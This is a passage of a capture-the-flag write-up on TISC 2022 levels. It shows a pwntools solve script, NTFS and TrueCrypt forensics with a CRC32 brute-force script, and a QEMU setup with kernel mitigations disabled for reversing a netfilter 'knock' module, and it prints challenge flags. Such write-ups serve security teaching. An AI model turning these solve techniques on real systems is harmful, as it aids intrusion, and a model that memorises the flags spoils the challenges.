</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;0&#39;</span><span class=o>*</span><span class=n>i</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;1&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;0&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>7</span><span class=o>-</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&lt;--&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;--&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>arr</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>),</span> <span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;--&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>chall</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>chall</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>==</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>tmp</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>arr</span><span class=p>[</span><span class=n>j</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>ans</span> <span class=o>=</span> <span class=n>tmp</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=n>tmp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ans</span> <span class=o>^=</span> <span class=n>k</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>ans</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p><code>TISC{d0N7_R0lL_Ur_0wN_cRyp70_7a25ee4d777cc6e9}</code></p><h2 id=level-3---patient0>LEVEL 3 - PATIENT0</h2><h3 id=part-1>Part 1</h3><p><img src=attachments/3/level_3_desc_pt1.png alt=image></p><p><em>Attached File:</em> <a href=attachments/3/PATIENT0>PATIENT0</a></p><p>Downloading the file, we can see that it is a NTFS file system.</p><pre tabindex=0><code>PATIENT0: DOS/MBR boot sector, code offset 0x52+2, OEM-ID &#34;NTFS    &#34;, sectors/cluster 8, Media descriptor 0xf8, sectors/track 0, FAT (1Y bit by descriptor); NTFS, physical drive 0xab3566f7, sectors 12287, $MFT start cluster 4, $MFTMirror start cluster 767, bytes/RecordSegment 2^(-1*246), clusters/index block 1, serial number 05c66c6b160cddda1
</code></pre><p>Opening it up in Autopsy, we can extract a file files:</p><ol><li>broken.pdf</li><li>message.png</li><li>message.png:$RAND</li></ol><p>If we look at the broken.pdf, we can extract a hint</p><pre tabindex=0><code>1. The BPB is broken, can you fix it?
</code></pre><p>If we search up BPB regardint NTFS, we can find this <a href=https://en.wikipedia.org/wiki/BIOS_parameter_block#NTFS>wikipedia page</a> which identifies BPB as the <strong>BIOS Parameter Block</strong>, which can be found between offset <strong>0xB - 0x50</strong> of the file.</p><p>If we look at the hex at these offsets of the file in 010editor, we can see the following</p><p><img src=attachments/3/010editor.png alt=image></p><p>As we can see, most of the hex in the BPB are uninteresting, however we can see <strong>TISC</strong> in an unused segment of the NTFS BPB block.</p><p>If we try to submit the hexadecimal for the next 4 bytes that come after it, we get our flag for part 1.</p><p><code>TISC{f76635ab}</code></p><h3 id=part-2>Part 2</h3><p>Now if we look at message.png</p><p><img src=attachments/3/message.png alt=image></p><p>We see that it has a BASE32 <em>(i initially tot it was base64 but cyberchef said otherwise)</em> which decoded to give us our second hint)_</p><pre tabindex=0><code>2. Thirsty for the flag? Go find the stream.
</code></pre><p>If we keep digging around, we find more hints at the start and the end of the <code>message.png:$RAND</code> file.</p><pre tabindex=0><code>3. Are these True random bytes for Cryptology?
4. If you need a password, the original reading of the BPB was actually Checked and ReChecked 32 times!
</code></pre><p>At this point I was rather stuck and confused about how to proceed.</p><p>I figured that hint 4 pointed to a CRC32 checksum but I could not seem to find a collision to get the original 4 bytes that was used as the flag in part 1.</p><p>At this point of the competition, many people were hardstuck at this level which pushed the organizers to release new hints.</p><p>The organizer released this image as one of the hint:</p><p><img src=attachments/3/truecrypt.jpg alt=image></p><p>which can be easily identified as truecrypt logo with a simple google search. Then it occurred to me that this was what hint 3 was pointing to.</p><p>If I had to guess, hint 2 probably pointed to the <code>message.png:$rand</code> byte stream.</p><p>Could it be that the stream of bytes were <strong>encrypted with TrueCrypt</strong>??</p><p>I removed the part 3 and part 4 hints from the start and end of the stream, then threw it into TrueCrypt while using the flag in part 1 as the password.</p><p>This presented me with the following picture:</p><p><img src=attachments/3/outer.jpg alt=image></p><p>It hinted to finding a <strong>key</strong> and had empty blanks for the last word. It was obvious that the missing word is <strong>collision</strong>, however since all the other words on the <em>piece of paper</em> were in leetspeak, we can expect the word <strong>collision</strong> to be in leetspeak as well.</p><p>This is where the final hint comes in. If we need a <strong>password</strong> <em>(the key in this context)</em>, the original reading of the BPB was <strong>CRC32</strong>-ed. This meant that the flag to part 1 is the CRC32 of the leetspeak version of <strong>collision</strong>.</p><p>To verify our assumptions, we can write a script to get a leetspeak collision to generate the same crc32 hash.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>zlib</span> <span class=kn>import</span> <span class=n>crc32</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>OUTER</span> <span class=o>=</span> <span class=s2>&#34;the ch3cksum h1des m4ny keys but the tru3 key re5embles an eng1ish w0rd wh1ch d3scribe5 th3 c0ndit1on of hash </span><span class=si>{}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>WORD</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=s2>&#34;collision&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>CRC32</span> <span class=o>=</span> <span class=mh>0xf76635ab</span>
</span></span><span class=line><span class=cl><span class=n>PERMUTATIONS</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;collision&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>LEET</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;o&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;0&#34;</span><span class=p>,</span> <span class=s2>&#34;o&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;l&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;1&#34;</span><span class=p>,</span> <span class=s2>&#34;l&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;i&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;1&#34;</span><span class=p>,</span> <span class=s2>&#34;i&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;s&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;5&#34;</span><span class=p>,</span> <span class=s2>&#34;s&#34;</span><span class=p>]}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>idx</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>WORD</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>PREV_PERMUTATIONS</span> <span class=o>=</span> <span class=n>PERMUTATIONS</span><span class=p>[:]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>WORD</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>LEET</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>PREV_PERMUTATIONS</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>PRIOR</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>perms</span> <span class=o>=</span> <span class=n>LEET</span><span class=p>[</span><span class=n>PRIOR</span><span class=p>[</span><span class=n>idx</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>perms</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>PRIOR</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>PRIOR</span><span class=p>)</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>PERMUTATIONS</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>PERMUTATIONS</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>PRIOR</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>EACH</span> <span class=ow>in</span> <span class=n>PERMUTATIONS</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>crc32</span><span class=p>(</span><span class=n>EACH</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span> <span class=o>==</span> <span class=n>CRC32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>EACH</span><span class=p>)</span>
</span></span></code></pre></div><p>which gave us an output of <code>c01lis1on</code> as the <strong>key/password</strong>.</p><p>However, where is the <em>hidden door</em> where we can use this <em>key</em>?</p><p>My first assumption was that it would be a stegotrick with the image, which led me to try various steganography methods which took passwords such as steghide. However it was all to no avail.</p><p>Demoralized and confused me was just trying everything possible, and when I tried to use the <em>key</em> to decrypt the same stream of bytes in TrueCrypt again, I was presented with a different decrypted file!!</p><p>I was shocked when it happened but ¯\_(ツ)_/¯ <em>magic only possible with the ancient TrueCrypt</em>.</p><p>Anyways, the decrypted file was a powerpoint macro-enabled slide which played a music and had the text: <code>flag is md5 checksum of the audio clip</code></p><p>This was trivial, and was easily solved by extracting the contents of the powerpoint and finding a file with a <code>.mp3</code> or <code>.wav</code> extension.</p><pre tabindex=0><code>❯ 7z x flag.ppsm

7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
p7zip Version 17.04 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs x64)

Scanning the drive for archives:
1 file, 1166196 bytes (1139 KiB)

Extracting archive: flag.ppsm
--
Path = flag.ppsm
Type = zip
Physical Size = 1166196

Everything is Ok

Files: 40
Size:       1218992

❯ find . -name &#39;*.mp3&#39; | md5sum
2bf2c64ad4b1047e324a08dcf77e98f2  -
</code></pre><p><code>TISC{2bf2c64ad4b1047e324a08dcf77e98f2}</code></p><p><em>wew that was painful but it only gets fun from here on</em></p><h2 id=level-4a---one-knock-away>LEVEL 4A - One Knock Away</h2><p><img src=attachments/4a/chall_4_desc.png alt=image></p><p><em>Files Attached:</em> <a href=attachments/4a/one>one</a></p><pre tabindex=0><code>❯ file one
one: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=01f0f37660f2bacdf200f5ad84e31b2dd7ff58df, with debug_info, not stripped
</code></pre><p>As we can see, we are presented with an ELF binary. Let&rsquo;s analyze it a little with <em>strings</em> as good practice.</p><p>We can find some interesting strings:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=o>{</span>% raw %<span class=o>}</span>TISC<span class=o>{</span>%s<span class=o>}{</span>% endraw %<span class=o>}</span>
</span></span><span class=line><span class=cl>Here is your flag!
</span></span><span class=line><span class=cl>%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x
</span></span><span class=line><span class=cl>6Loading PALINDROME module...
</span></span><span class=line><span class=cl>6Cleaning up PALINDROME module.
</span></span><span class=line><span class=cl>852301e1234000e61546c131345e8b8a
</span></span><span class=line><span class=cl>ec9cbcbeaf6327c7d0b9f89df3df9423
</span></span><span class=line><span class=cl>8aee1f7493a36660dd398cc005777f37
</span></span><span class=line><span class=cl>01e26c52317ea6003c5097aa0666ba22
</span></span><span class=line><span class=cl>5526021d73a11a9d0775f47f7e4754c4
</span></span><span class=line><span class=cl><span class=nv>license</span><span class=o>=</span>GPL
</span></span><span class=line><span class=cl><span class=nv>author</span><span class=o>=</span>CY1603
</span></span><span class=line><span class=cl><span class=nv>description</span><span class=o>=</span>N3tf1lt3r
</span></span><span class=line><span class=cl><span class=nv>srcversion</span><span class=o>=</span>F63509672DA292C35B02A9C
</span></span><span class=line><span class=cl><span class=nv>depends</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=nv>retpoline</span><span class=o>=</span>Y
</span></span><span class=line><span class=cl><span class=nv>name</span><span class=o>=</span>one
</span></span><span class=line><span class=cl><span class=nv>vermagic</span><span class=o>=</span>5.13.0-40-generic SMP mod_unload modversions
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>printk
</span></span><span class=line><span class=cl>crypto_skcipher_decrypt
</span></span><span class=line><span class=cl>crypto_req_done
</span></span><span class=line><span class=cl>sg_init_one
</span></span><span class=line><span class=cl>kmem_cache_alloc_trace
</span></span><span class=line><span class=cl>kmalloc_caches
</span></span><span class=line><span class=cl>kfree_sensitive
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>/home/ubuntu/Downloads/tisc2022/final
</span></span></code></pre></div><p>With some experience, we can identify strings like <strong>printk</strong>, <strong>kmalloc</strong>, <strong>kfree</strong> to be kernel functions.</p><p>We can also see that this binary has a description that says <strong>N3tf1lt3r</strong>. Since it&rsquo;s a kernel program, we can try to load it into our kernel with <code>sudo insmod one</code> command.</p><p>However if we try to load the module into kernel, we get an error as such:</p><pre tabindex=0><code>insmod: ERROR: could not insert module one.ko: Invalid module format
</code></pre><p>If we google this error, we can find a <a href=https://stackoverflow.com/questions/34379013/insmod-error-inserting-hello-ko-1-invalid-module-format>stackoverflow link</a> that mentions:</p><blockquote><p>Kernel from which you build your kernel module and to which you are inserting module should be of same version.</p></blockquote><p>Looking back at our strings, we can see that the module was likely compiled on a <strong>Ubuntu</strong> vm with <code>5.13.0-40-generic</code> kernel version.</p><p>We can boot up a Ubuntu VM, and then install the <code>5.13.0-40-generic</code> kernel version via apt install.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo apt-get install linux-modules-5.13.0-40-generic linux-headers-5.13.0-40-generic linux-image-5.13.0-40-generic
</span></span></code></pre></div><p>For debugging purposes, we will want to extract the kernel <em>(vmlinuz)</em> and run it in a QEMU-VM so we can attach our GDB.</p><p>We can extract it from <code>/boot/vmlinuz-5.13.0-40-generic</code>.</p><p>As for our file system, we will use a small busybox initramfs that we can easily get online. For simplicity sake, I reused an <a href=attachments/4a/initramfs.cpio.gz>initramfs</a> from an old hxpctf kernel-rop challenge and modified some files to insert the <code>one</code> kernel module on boot.</p><p>I used this configuration to boot the qemu vm:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>qemu-system-x86_64 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -m 128M <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -cpu kvm64 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -kernel vmlinuz <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -initrd initramfs.cpio.gz <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -snapshot <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -nographic <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -monitor /dev/null <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -no-reboot <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -append <span class=s2>&#34;console=ttyS0 nokaslr nopti quiet panic=1 nosmap nosmep&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -s
</span></span></code></pre></div><p>which would allow us to debug the kernel from gdb on TCP <code>1234</code>.</p><p>Additionally, we will modify our <code>/etc/init.d/rcS</code> inside of our initramfs to run <code>insmod /one.ko</code> to load the module on startup.</p><p>Finally, we can startup our VM by running <code>run.sh</code> and then attaching GDB <em>(with GEF extension)</em> with <code>gef-remote</code>.</p><p>If we run <code>lsmod</code> inside of the VM,</p><pre tabindex=0><code>/ # lsmod
one 16384 0 - Live 0xffffffffc0002000 (OE)
</code></pre><p>we can see that our module is loaded at a constant address of <code>0xffffffffc0002000</code>.</p><p>Now that we have our environment setup, let&rsquo;s further reverse our kernel module.</p><h3 id=reverse-engineering-our-kernel-module>Reverse Engineering our kernel module</h3><p>Out of laziness, I skimmed through all the functions to get a rough idea of what each function does.</p><p>If we look at the <code>init_module()</code> function which is similar to the <code>main()</code> function in a normal C program, we see that it creates a net hook to call a <strong>hook_func</strong> when some conditions are met.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>init_module</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>_fentry__</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>nfho</span><span class=p>.</span><span class=n>hook</span> <span class=o>=</span> <span class=p>(</span><span class=n>nf_hookfn</span> <span class=o>*</span><span class=p>)</span><span class=n>hook_func</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>nfho</span><span class=p>.</span><span class=n>pf</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>nfho</span><span class=p>.</span><span class=n>hooknum</span> <span class=o>=</span> <span class=mh>0x8000000000000000LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>nf_register_net_hook</span><span class=p>(</span><span class=o>&amp;</span><span class=n>init_net</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>nfho</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printk</span><span class=p>(</span><span class=n>byte_BB8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This hook function calls another unnamed function <code>sub_865</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>hook_func</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>_fentry__</span><span class=p>(</span><span class=n>a1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>sub_865</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The <code>sub_865</code> function seems to do some stuff, then makes some sort of strcmp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_865</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>,</span> <span class=kr>__int64</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>		  <span class=c1>// truncated
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>v7</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>v6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>check</span><span class=p>[</span><span class=n>v6</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>              <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span> <span class=o>++</span><span class=n>v6</span> <span class=o>==</span> <span class=mi>5</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>              <span class=k>return</span> <span class=nf>hook_func_cold</span><span class=p>();</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=n>v8</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=o>*</span><span class=p>)</span><span class=nf>kmem_cache_alloc_trace</span><span class=p>(</span><span class=n>kmalloc_caches</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span> <span class=mi>3520LL</span><span class=p>,</span> <span class=mi>16LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>ppyq</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>v8</span><span class=p>,</span> <span class=n>v5</span><span class=p>,</span> <span class=mi>2uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		  <span class=c1>// truncated
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>val</span><span class=p>[</span><span class=n>v7</span><span class=p>],</span> <span class=n>s</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>store</span><span class=p>[</span><span class=n>v7</span><span class=p>]</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>check</span><span class=p>[</span><span class=n>v7</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>check</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>check</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		  <span class=c1>// truncated
</span></span></span></code></pre></div><p>This function seems to do some string comparison with <strong>val</strong>, and if it passes the comparison, it will store a value in a variable <strong>store</strong> and set <strong>check</strong> to 1.</p><p>It repeats this check for all 5 values of <strong>val</strong> and respectively modify <strong>check</strong> and <strong>store</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>val</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;852301e1234000e61546c131345e8b8a&#34;</span><span class=p>,</span> <span class=s2>&#34;ec9cbcbeaf6327c7d0b9f89df3df9423&#34;</span><span class=p>,</span> <span class=s2>&#34;8aee1f7493a36660dd398cc005777f37&#34;</span><span class=p>,</span> <span class=s2>&#34;01e26c52317ea6003c5097aa0666ba22&#34;</span><span class=p>,</span> <span class=s2>&#34;5526021d73a11a9d0775f47f7e4754c4&#34;</span><span class=p>]</span>
</span></span></code></pre></div><p>If we look inside the <strong>pypyq</strong> function</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>bool</span> <span class=kr>__fastcall</span> <span class=nf>ppyq</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>result</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>data</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// edx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// er14
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// rbx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=o>*</span><span class=n>v6</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=o>*</span><span class=n>v7</span><span class=p>;</span> <span class=c1>// r15
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>_fentry__</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=nf>crypto_alloc_shash</span><span class=p>(</span><span class=s>&#34;md5&#34;</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>128LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=p>(</span><span class=kr>__int64</span> <span class=o>*</span><span class=p>)</span><span class=nf>_kmalloc</span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>v5</span> <span class=o>+</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>3264LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>v6</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v5</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=n>v6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>v5</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=p>)</span>
